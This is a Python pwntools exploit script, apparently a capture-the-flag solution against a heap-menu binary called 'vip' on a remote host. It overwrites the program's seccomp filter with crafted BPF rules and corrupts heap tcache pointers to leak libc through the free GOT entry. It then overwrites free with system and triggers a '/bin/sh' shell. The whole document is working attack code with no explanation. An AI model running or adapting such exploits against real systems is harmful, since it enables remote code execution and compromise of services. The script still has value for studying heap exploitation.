#coding=utf-8
from pwn import *
local = 0
exec_file="./vip"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
argv=["seccomp-tools","dump","./vip"]
if local :
    a=process(exec_file)
    #a=process(argv=argv)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("112.126.103.14",9999)
    libc=ELF("./libc-2.27.so")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    #text_base,libc_base=get_base(a)
    #script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script='''
    b *0x0000000004013D9
    b *0x00000000004014EB
    '''
    gdb.attach(a,script)

def menu(idx):
    a.sendlineafter("hoice: ",str(idx))
def add(idx):
    menu(1)
    a.sendlineafter("Index: ",str(idx))
def delete(idx):
    menu(3)
    a.sendlineafter("Index: ",str(idx))
def show(idx):
    menu(2)
    a.sendlineafter("Index: ",str(idx))
def edit(idx,size,content):
    menu(4)
    a.sendlineafter("Index: ",str(idx))
    a.sendlineafter("Size: ",str(size))
    a.sendafter("tent: ",content)
def rule(code,jt ,jf ,k):
    return p16(code) + p8(jt) + p8(jf) + p32(k) 
def build_rule():
    payload = ''
    #payload+= rule(0x20 ,0x00, 0x00, 0x00000004) #  A = arch
    #payload+= rule(0x15 ,0x00, 0x03, 0xc000003e) #  if (A != ARCH_X86_64) goto 0010
    payload+= rule(0x20 ,0x00, 0x00, 0x00000000) #  A = sys_number
    #payload+= rule(0x15 ,0x01, 0x00, 0x0000003b)
    #payload+= rule(0x15 ,0x04, 0x00, 0x00000101) #  if (A != open) goto 0009
    #payload+= rule(0x15 ,0x03, 0x00, 0x00000101)
    #payload+= rule(0x15 ,0x02, 0x03, 0x00000101)
    #payload+= rule(0x15 ,0x01, 0x02, 0x00000101)
    #payload+= rule(0x15 ,0x04, 0x03, 0x00000101)
    payload+= rule(0x15 ,0x00, 0x02, 0x00000101)
    payload+= rule(0x20 ,0x00, 0x00, 0x00000018)
    payload+= rule(0x15, 0x01, 0x00, 0x0040207e)
    #payload+= rule(0x15 ,0x01, 0x00, 0x0000007e) #  A = args[0]
    #payload+= rule(0x54 ,0x00, 0x00, 0x000000ff) #  A &= 0xff
    #payload+= rule(0x15 ,0x01, 0x00, 0x0000007c) #  if (A == 124) goto 0010
    payload+= rule(0x06 ,0x00, 0x00, 0x7fff0000) #  return ALLOW
    payload+= rule(0x06 ,0x00, 0x00, 0x00050000) #  return ERRNO(2)
    return payload 

def vip(name):
    menu(6)
    a.sendafter("\n",name)
#debug()
#vip("")
#debug()
vip('A'*0x20+build_rule())
#vip('A'*0x20+build_rule2())
#add(0)
#debug()

add(0)

add(1)
add(2)
delete(1)
payload='A'*0x58+p64(0x51)+p64(0x000000000404100)
#debug()
edit(0,len(payload),payload)
add(3)
add(4)
puts_got=elf.got["puts"]
free_got=elf.got["free"]
payload=p64(free_got)+p64(free_got)
edit(4,len(payload),payload)
show(0)
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["free"]
print hex(libc_base)
system_addr=libc_base+libc.symbols["system"]
edit(1,8,p64(system_addr))

edit(3,8,"/bin/sh\x00")

delete(3)

a.interactive()









